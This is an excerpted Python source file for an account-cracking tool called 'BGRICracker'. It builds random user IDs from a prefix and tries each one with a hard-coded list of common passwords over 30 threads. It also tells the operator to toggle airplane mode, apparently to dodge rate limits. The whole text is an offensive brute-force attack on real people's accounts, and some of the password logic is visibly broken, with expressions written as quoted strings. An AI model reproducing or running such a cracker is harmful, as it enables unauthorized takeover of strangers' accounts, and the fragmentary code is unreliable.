...
\x1b[1;96m   ➤ \x1b[1;92mCreator        : \x1b[1;97mSHIV
\x1b[1;96m   ➤ \x1b[1;92mOperated By    : \x1b[1;97mG S X
...
class BGRICracker:
    ...
    def old_menu(self):
        ...
        print(f"{self.color.P} {self.color.W}[1] {self.color.G}M1                {self.color.P}")
        print(f"{self.color.P} {self.color.W}[2] {self.color.G}M2            {self.color.P}")
        print(f"{self.color.P} {self.color.W}[0] {self.color.R}⇦ EXIT                {self.color.P}")
    ...
    def execute_breach(self, prefix):
        ...
        passlist = ['123456789', '123456', '12345678', '1234567', '1234567890','57273200','59039200','57575751','password','PASSWORD','11223344','112233']
...
def random_last6_mobile():
    start_digit = str(secrets.choice([7, 8, 9]))  # भारत मोबाइल जैसा
    rest_digits = f"{secrets.randbelow(100000):05d}"  # 5 अंक, zero-padding
    return start_digit + rest_digits

# UIDAB वेरिएबल में कोड
...
def __Old1__():
    ...
    linex()
    year_code = input("sim cod")
    for i in range(int(limit)):
    	data=str(random.choice(range(100000,999999)));user.append(data)
    with tred(max_workers=30) as jihad:
        ...
        print(f'\33[38;5;160m[\033[1;97m\33[38;5;160m] \033[1;97mUSED AIRPLANE MODE AFTER 1 MINUTE ')
        linex()
        for mal in user:
        	uid=year_code+mal
...
def login1(uid):
    ...
    try:
        ...
        ua = windows()
        for pw in ["year_code[:4] + data[:2]","year_code[:4] + data[:4]","year_code[:4] + data[:6]","57273200","59039200"]:
